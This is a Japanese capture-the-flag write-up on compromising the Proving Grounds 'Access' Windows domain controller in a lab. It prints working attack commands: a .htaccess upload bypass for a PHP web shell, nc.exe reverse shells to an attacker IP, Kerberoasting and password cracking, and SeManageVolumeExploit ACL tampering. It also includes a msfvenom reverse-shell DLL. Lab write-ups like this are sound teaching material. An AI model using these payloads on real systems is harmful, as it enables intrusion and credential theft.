# Proving Grounds Practice - Access Writeup

**Community Rating:** 未確認

+++
title = "Proving Grounds Practice - Access Writeup"
date = "2026-10-28"
description = "Webシェルから初期アクセスを取得し、Kerberoastingでsvc_mssqlの認証情報を特定。SeManageVolumePrivilegeを利用した権限昇格を試みる"
tags = ["Proving Grounds Practice", "CTF", "[Windows]", "[Access]", "[Apache]", "[Web Shell]", "[Kerberoasting]", "[SeManageVolumePrivilege]", "[Privilege Escalation]", "[Active Directory]"]
categories = ["Proving Grounds Practice"]
toc = true
draft = false
+++

## Machine Info

| Field | Details |
|-------|---------|
| Machine | Access |
| OS | Windows Server 2019 Standard |
| Target IP | 192.168.131.187 |
| Domain | access.offsec |

---

## Reconnaissance

### Nmap Scan

まず、対象ホストに対して全TCPポートのスキャンとサービス検出を実行する。

```bash
nmap -sV -sC -p- 192.168.131.187
```

スキャン結果から、以下のポートが開いていることを確認した。

```text
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.48
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
443/tcp   open  ssl/http      Apache httpd 2.4.48
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp  open  tcpwrapped
9389/tcp  open  mc-nmf         .NET Message Framing
```

対象ホストはActive Directoryのドメインコントローラーとして動作しており、HTTPサービスとしてApache 2.4.48、PHP 8.0.7が稼働していた。

Webサービスを起点とする初期アクセスと、Active Directoryの認証情報を利用した権限昇格の可能性を調査する。

### Directory Enumeration

Gobusterを使用してWebディレクトリを列挙する。

```bash
gobuster dir -u http://192.168.131.187 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

主な結果は以下のとおり。

```text
/uploads   (Status: 301)
/assets    (Status: 301)
/forms     (Status: 301)
/examples  (Status: 503)
/phpmyadmin (Status: 403)
```

`uploads`、`assets`、`forms`などのディレクトリが見つかった。Webアプリケーションのファイルアップロード機能を重点的に調査する。

---

## Initial Access

### Upload Functionality

Webサイトの「Buy Tickets」機能からファイルをアップロードできることを確認した。

アップロードされたファイルをPHPとして処理させるため、次の内容を持つ `.htaccess` を用意した。

```apache
AddType application/x-httpd-php .evil
```

この設定では、`.evil` 拡張子のファイルをPHPとして処理するようApacheに指定している。

PHP Web Shellとして、以下のリポジトリのコードを利用した。

- [wwolf-php-webshell](https://github.com/WhiteWinterWolf/wwwolf-php-webshell)

Web Shellをアップロードし、拡張子を `.evil` に変更することで、Web経由でコマンドを実行できる状態にした。

### Reverse Shell

Kali側で待ち受けを開始する。

```bash
nc -lvnp 4445
```

Web Shell経由で、対象ホスト上の `nc.exe` を実行し、Kaliへ接続させた。

```cmd
nc.exe 192.168.45.155 4445 -e cmd.exe
```

接続が確立した。

```text
listening on [any] 4445 ...
connect to [192.168.45.155] from (UNKNOWN) [192.168.131.187] 50793

Microsoft Windows [Version 10.0.17763.2746]
```

これにより、対象ホスト上でコマンドを実行できるシェルを取得した。

### Local User Enumeration

取得したシェルでローカルユーザーを列挙する。

```cmd
net users
```

結果：

```text
Administrator
Guest
krbtgt
svc_apache
svc_mssql
```

`svc_mssql` というサービスアカウントが存在することを確認した。次に、Active Directoryの情報とサービスアカウントの認証情報を調査する。

---

## Credential Discovery

### PowerView Enumeration

PowerViewをロードして、`svc_mssql` のActive Directory属性を取得した。

```powershell
Import-Module .\PowerView.ps1
Get-NetUser svc_mssql
```

出力から、以下の情報が確認できた。

```text
samaccountname                : svc_mssql
distinguishedname             : CN=MSSQL,CN=Users,DC=access,DC=offsec
serviceprincipalname          : MSSQLSvc/DC.access.offsec
useraccountcontrol            : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
```

`svc_mssql` にはService Principal Name（SPN）が設定されている。そのため、Kerberoastingによってサービスチケットを取得し、オフラインでパスワード解析できる可能性がある。

### Kerberoasting with Rubeus

Rubeusを取得し、対象ホスト上でKerberoastingを実行した。

```powershell
.\Rubeus.exe kerberoast /nowrap
```

実行結果では、Kerberoast可能なアカウントが1件検出された。

```text
[*] Target Domain          : access.offsec
[*] Total kerberoastable users : 1

[*] SamAccountName         : svc_mssql
[*] ServicePrincipalName   : MSSQLSvc/DC.access.offsec
[*] Supported ETypes       : RC4_HMAC_DEFAULT
```

出力されたTGSハッシュをKali側に保存し、John the Ripperでパスワード解析を行う。

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

解析結果：

```text
trustno1         (?)
```

これにより、`svc_mssql` のパスワードとして `trustno1` が得られた。

---

## Lateral Movement

### RunasCs

取得した認証情報を使用して、`svc_mssql` としてコマンドを実行する。

対象ホスト上で `Invoke-RunasCs.ps1` をロードした。

```powershell
Import-Module .\Invoke-RunasCs.ps1
```

まず、実行ユーザーを確認する。

```powershell
Invoke-RunasCs svc_mssql trustno1 whoami
```

結果：

```text
[*] Warning: The logon for user 'svc_mssql' is limited.
Use the flag combination --bypass-uac and --logon-type '8'
to obtain a more privileged token.

access\svc_mssql
```

`access\svc_mssql` としてコマンドを実行できた。続いて、同アカウントのシェルを取得する。

Kali側：

```bash
nc -lvnp 4444
```

対象ホスト側：

```powershell
Invoke-RunasCs svc_mssql trustno1 'c:/xampp/htdocs/uploads/nc.exe 192.168.45.155 4444 -e cmd.exe'
```

Kali側で接続を確認した。

```text
listening on [any] 4444 ...
connect to [192.168.45.155] from (UNKNOWN) [192.168.131.187] 51243

Microsoft Windows [Version 10.0.17763.2746]
```

このシェルで権限を確認する。

```cmd
whoami /priv
```

主な結果：

```text
SeMachineAccountPrivilege        Disabled
SeChangeNotifyPrivilege           Enabled
SeManageVolumePrivilege           Disabled
SeIncreaseWorkingSetPrivilege     Disabled
```

`SeManageVolumePrivilege` が表示された。ただし、この時点では `Disabled` であり、有効な特権として利用できることまでは確認できていない。

---

## Privilege Escalation

既存のwriteupと同じ手順でもなんかうまくいかなかったｗ


### SeManageVolumeExploit

Windowsのボリューム管理に関連する権限を利用するため、以下の公開ツールを使用した。

- [SeManageVolumeExploit - GitHub Releases](https://github.com/CsEnox/SeManageVolumeExploit/releases)

対象ホストにツールを転送し、実行した。

```powershell
iwr -uri http://192.168.45.155/SeManageVolumeExploit.exe `
  -OutFile SeManageVolumeExploit.exe
```

```powershell
.\SeManageVolumeExploit.exe
```

実行結果：

```text
Entries changed: 926
DONE
```

実行前の `C:\Windows` のアクセス許可では、Usersグループは読み取り・実行権限だった。

```text
BUILTIN\Users:(RX)
BUILTIN\Users:(OI)(CI)(IO)(GR,GE)
```

実行後、同じディレクトリのアクセス許可を再確認した。

```powershell
icacls C:\Windows
```

主な差分：

```text
BUILTIN\Users:(M)
BUILTIN\Users:(OI)(CI)(IO)(F)
```

この結果から、`C:\Windows` 以下のアクセス許可が変更されたことを確認した。

### Windows Error Reporting Trigger

次に、Windows Error Reporting（WER）を利用する手法を試した。

利用したツール：

- [WerTrigger - GitHub](https://github.com/sailay1996/WerTrigger)

READMEに記載されている手順は以下のとおり。

1. `phoneinfo.dll` を `C:\Windows\System32\` に配置する。
2. `Report.wer` と `WerTrigger.exe` を同じディレクトリに置く。
3. `WerTrigger.exe` を実行する。

対象ホストでは、以下のようにファイルを配置した。

```text
C:\Windows\System32\phoneinfo.dll
C:\xampp\htdocs\uploads\enox\Report.wer
C:\xampp\htdocs\uploads\enox\WerTrigger.exe
```

実行した。

```cmd
cd C:\xampp\htdocs\uploads\enox
WerTrigger.exe
```

しかし、実行結果は次のとおりだった。

```text
[+] Windows Error Reporting Trigger by @404death !
[+] Trigger launched.
[*] TCP connecting...
[*] Waiting for the DLL to be loaded...
[-] Unable to connect to server!
[*] Retrying ...
[-] Unable to connect to server!
[*] Retrying ...
[-] Unable to connect to server!
[-] Exploit failed.
```

Kali側とWindows側で3ファイルのMD5を比較したところ、`WerTrigger.exe`、`Report.wer`、`phoneinfo.dll` はそれぞれ一致していた。そのため、少なくともファイル転送時の破損は確認されなかった。

一方で、WERトリガーによる処理は失敗しており、この段階ではSYSTEMシェルを取得できていない。接続失敗の原因も、現在のログだけでは特定できていない。

### Alternative DLL Attempt

別の方法として、リバースシェル用DLLを生成した。

```bash
msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST=192.168.45.155 LPORT=135 \
  -f dll -o tzres.dll
```

対象ホストの `C:\Windows\System32\wbem` で `tzres.dll` を取得・配置し、`systeminfo` によってOS情報を確認した。

```text
OS Name:     Microsoft Windows Server 2019 Standard
OS Version:  10.0.17763 N/A Build 17763
Domain:      access.offsec
```

ただし、この手法でもリバースシェルの確立は確認できていないため、成功した権限昇格手順としては扱わない。

---

## Summary

今回の調査では、Webアプリケーションのファイルアップロード機能を起点として初期アクセスを取得し、Active Directoryのサービスアカウントを列挙した。

Kerberoastingによって `svc_mssql` のTGSハッシュを取得し、John the Ripperでパスワード `trustno1` を特定した。その認証情報を利用して `access\svc_mssql` としてコマンドを実行し、追加のシェルを取得した。


攻略の進捗は以下のとおり。

1. Nmapによるポート・サービス列挙
2. GobusterによるWebディレクトリ列挙
3. ファイルアップロード機能を利用したWeb Shellの設置
4. リバースシェルによる初期アクセス
5. PowerViewでのサービスアカウント列挙
6. RubeusによるKerberoasting
7. John the Ripperによるパスワード解析
8. RunasCsによる `svc_mssql` としてのコマンド実行
9. SeManageVolumeExploitによるWindowsディレクトリのACL変更
10. WerTriggerを利用した権限昇格を試みたが、失敗


